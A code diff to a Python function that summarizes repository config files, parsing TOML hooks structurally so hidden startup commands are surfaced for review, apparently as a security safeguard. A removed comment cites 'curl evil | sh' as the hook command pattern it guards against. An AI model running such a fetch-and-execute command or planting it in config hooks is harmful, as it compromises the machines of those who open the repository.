@@ -28,6 +28,7 @@ from __future__ import annotations
 import hashlib
 import json
 import logging
+import tomllib
 from pathlib import Path
 
 _log = logging.getLogger(__name__)
@@ -234,12 +235,32 @@ def summarize_repo_configs(search_from: Path | str) -> str:
             lines.append("  <unreadable>")
             continue
         if path.name == "config.toml":
-            # Echo every line mentioning a sensitive key — hooks' command
-            # lines included, so "curl evil | sh" can't hide behind a byte count.
+            # Parse TOML structurally so multi-line strings, inline tables, and
+            # nested values can't hide hook commands (P2-1 regression test:
+            # a multi-line `command = """\n...\n"""` was previously invisible
+            # because only raw lines containing a sensitive key were echoed).
+            try:
+                with open(path, "rb") as _f:
+                    data = tomllib.load(_f)
+            except Exception:
+                data = {}
+            hooks = data.get("hooks", [])
+            if hooks:
+                lines.append("  [[hooks]]")
+                for h in hooks:
+                    h = h or {}
+                    cmd = h.get("command")
+                    if cmd:
+                        lines.append(f"    command = {cmd!r}")
+                    ev = h.get("event")
+                    if ev:
+                        lines.append(f"    event = {ev!r}")
+            # Echo every line mentioning a sensitive key (non-hook keys).
             for ln in text.splitlines():
                 s = ln.strip()
                 if any(k in s for k in _SENSITIVE_KEYS) and "=" in s:
-                    lines.append(f"  {s}")
+                    if not s.startswith("[[hooks]]") and not s.startswith("command =") and not s.startswith("event ="):
+                        lines.append(f"  {s}")
         else:  # .mcp.json — list servers (they spawn/connect at startup)
             try:
                 servers = json.loads(text).get("mcpServers", {})
